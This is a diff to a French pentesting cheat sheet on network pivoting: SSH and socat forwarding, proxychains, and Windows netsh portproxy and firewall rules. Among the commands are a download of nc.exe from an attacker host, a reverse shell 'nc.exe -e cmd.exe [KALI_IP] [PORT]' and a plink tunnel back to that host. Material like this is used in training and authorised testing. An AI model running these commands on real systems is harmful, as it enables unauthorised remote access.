@@ -17,6 +17,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 socat -ddd TCP-LISTEN:[listening_local_port_on_dmz],fork TCP:[internal_ip]:[internal_port]
+
 ```
 
 
@@ -29,6 +30,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 ssh -N -L 0.0.0.0:[local_port_on_rev_shell]:[internal_ip_target]:[internal_ip_port] username@internal_host
+
 ```
 
 
@@ -41,6 +43,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host
+
 ```
 
 
@@ -50,6 +53,7 @@ ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host
 # /etc/proxychains4.conf
 [ProxyList]
 socks5 127.0.0.1 [local_socks_proxy_port]
+
 ```
 
 
@@ -58,6 +62,7 @@ socks5 127.0.0.1 [local_socks_proxy_port]
 ```bash
 # Par exemple
 proxychains smbclient -L //internal_ip/ -U username --password=password
+
 ```
 
 
@@ -70,10 +75,11 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 ssh -N -R 127.0.0.1:[remote_port_on_ssh_host]:[internal_target_ip]:[internal_target_port] username@remote_host
+
 ```
 
 
-## SSH Remote Dynamic Redirection de ports
+## Redirection dynamique distante via SSH
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -82,6 +88,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 ssh -N -R [proxychains_port] username@remote_host
+
 ```
 
 
@@ -91,6 +98,7 @@ ssh -N -R [proxychains_port] username@remote_host
 # /etc/proxychains4.conf
 [ProxyList]
 socks5 127.0.0.1 [proxychains_port]
+
 ```
 
 
@@ -104,6 +112,7 @@ Observer les permissions et la configuration de Windows.
 ```powershell
 where ssh
 ssh.exe -V
+
 ```
 
 
@@ -111,6 +120,7 @@ ssh.exe -V
 
 ```powershell
 ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]
+
 ```
 
 
@@ -120,6 +130,7 @@ ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]
 # Edit /etc/proxychains4.conf and add
 [ProxyList]
 socks5 127.0.0.1 [REMOTE_PORT]
+
 ```
 
 
@@ -127,6 +138,7 @@ socks5 127.0.0.1 [REMOTE_PORT]
 
 ```bash
 ss -ntplu
+
 ```
 
 
@@ -139,6 +151,7 @@ Observer les permissions et la configuration de Windows.
 
 ```bash
 sudo systemctl start apache2
+
 ```
 
 
@@ -151,6 +164,7 @@ sudo systemctl start apache2
 ```bash
 find / -name nc.exe 2>/dev/null
 sudo cp [SOURCE_PATH]/nc.exe /var/www/html/
+
 ```
 
 
@@ -162,6 +176,7 @@ sudo cp [SOURCE_PATH]/nc.exe /var/www/html/
 
 ```powershell
 wget -Uri http://[KALI_IP]/nc.exe -OutFile C:\Windows\Temp\nc.exe
+
 ```
 
 
@@ -173,6 +188,7 @@ wget -Uri http://[KALI_IP]/nc.exe -OutFile C:\Windows\Temp\nc.exe
 
 ```powershell
 C:\Windows\Temp\nc.exe -e cmd.exe [KALI_IP] [PORT]
+
 ```
 
 
@@ -181,6 +197,7 @@ C:\Windows\Temp\nc.exe -e cmd.exe [KALI_IP] [PORT]
 ```bash
 find / -name plink.exe 2>/dev/null
 sudo cp [SOURCE_PATH]/plink.exe /var/www/html/
+
 ```
 
 
@@ -188,6 +205,7 @@ sudo cp [SOURCE_PATH]/plink.exe /var/www/html/
 
 ```powershell
 wget -Uri http://[KALI_IP]/plink.exe -OutFile C:\Windows\Temp\plink.exe
+
 ```
 
 
@@ -195,6 +213,7 @@ wget -Uri http://[KALI_IP]/plink.exe -OutFile C:\Windows\Temp\plink.exe
 
 ```powershell
 cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l [USER] -pw [PASSWORD] -R [LOCAL_PORT]:127.0.0.1:[REMOTE_PORT] [KALI_IP]
+
 ```
 
 
@@ -202,6 +221,7 @@ cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l [USER] -pw [PASSWORD] -R [
 
 ```bash
 xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:127.0.0.1:[LOCAL_PORT]
+
 ```
 
 
@@ -218,6 +238,7 @@ Observer les permissions et la configuration de Windows.
 
 ```powershell
 netsh interface portproxy add v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP] connectport=[CONNECT_PORT] connectaddress=[CONNECT_IP]
+
 ```
 
 
@@ -225,6 +246,7 @@ netsh interface portproxy add v4tov4 listenport=[LISTEN_PORT] listenaddress=[LIS
 
 ```powershell
 netstat -anp TCP | find "[LISTEN_PORT]"
+
 ```
 
 
@@ -232,11 +254,14 @@ netstat -anp TCP | find "[LISTEN_PORT]"
 
 ```powershell
 netsh interface portproxy show all
+
 ```
 
 
 ```powershell
+# Examiner ou modifier le routage réseau Windows
 netsh advfirewall firewall add rule name="[RULE_NAME]" protocol=TCP dir=in localip=[LISTEN_IP] localport=[LISTEN_PORT] action=allow
+
 ```
 
 
@@ -244,6 +269,7 @@ netsh advfirewall firewall add rule name="[RULE_NAME]" protocol=TCP dir=in local
 
 ```bash
 ssh [USER]@[LISTEN_IP] -p[LISTEN_PORT]
+
 ```
 
 
@@ -251,11 +277,14 @@ ssh [USER]@[LISTEN_IP] -p[LISTEN_PORT]
 
 ```powershell
 netsh advfirewall firewall delete rule name="[RULE_NAME]"
+
 ```
 
 
 ```powershell
+# Configurer une redirection de port avec Netsh
 netsh interface portproxy del v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP]
+
 ```
 
 ---
